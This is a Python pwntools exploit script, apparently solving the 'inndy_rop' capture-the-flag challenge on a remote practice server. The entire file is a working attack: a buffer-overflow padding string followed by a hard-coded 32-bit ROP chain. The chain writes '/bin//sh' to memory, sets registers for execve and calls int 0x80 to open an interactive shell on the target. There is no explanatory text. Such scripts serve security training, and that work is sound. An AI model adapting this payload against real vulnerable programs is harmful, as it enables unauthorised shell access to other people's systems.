#! /usr/bin/python

import sys
from pwn import *
from struct import pack

if(sys.argv[1] == 'l'):
	sh = process('./inndy_rop')
	elf = ELF('./inndy_rop')
else:
	sh = remote('node3.buuoj.cn',27617)
	elf = ELF('./inndy_rop')


def main():

	# Padding goes here
	p = 'A' * 0xC + 'dead'

	p += pack('<I', 0x0806ecda) # pop edx ; ret
	p += pack('<I', 0x080ea060) # @ .data
	p += pack('<I', 0x080b8016) # pop eax ; ret
	p += '/bin'
	p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806ecda) # pop edx ; ret
	p += pack('<I', 0x080ea064) # @ .data + 4
	p += pack('<I', 0x080b8016) # pop eax ; ret
	p += '//sh'
	p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806ecda) # pop edx ; ret
	p += pack('<I', 0x080ea068) # @ .data + 8
	p += pack('<I', 0x080492d3) # xor eax, eax ; ret
	p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080481c9) # pop ebx ; ret
	p += pack('<I', 0x080ea060) # @ .data
	p += pack('<I', 0x080de769) # pop ecx ; ret
	p += pack('<I', 0x080ea068) # @ .data + 8
	p += pack('<I', 0x0806ecda) # pop edx ; ret
	p += pack('<I', 0x080ea068) # @ .data + 8
	p += pack('<I', 0x080492d3) # xor eax, eax ; ret
	p += pack('<I', 0x0807a66f) # inc eax ; ret
	p += pack('<I', 0x0807a66f) # inc eax ; ret
	p += pack('<I', 0x0807a66f) # inc eax ; ret
	p += pack('<I', 0x0807a66f) # inc eax ; ret
	p += pack('<I', 0x0807a66f) # inc eax ; ret
	p += pack('<I', 0x0807a66f) # inc eax ; ret
	p += pack('<I', 0x0807a66f) # inc eax ; ret
	p += pack('<I', 0x0807a66f) # inc eax ; ret
	p += pack('<I', 0x0807a66f) # inc eax ; ret
	p += pack('<I', 0x0807a66f) # inc eax ; ret
	p += pack('<I', 0x0807a66f) # inc eax ; ret
	p += pack('<I', 0x0806c943) # int 0x80

	sh.sendline(p)
	sh.interactive()

if __name__ == '__main__':
	main()
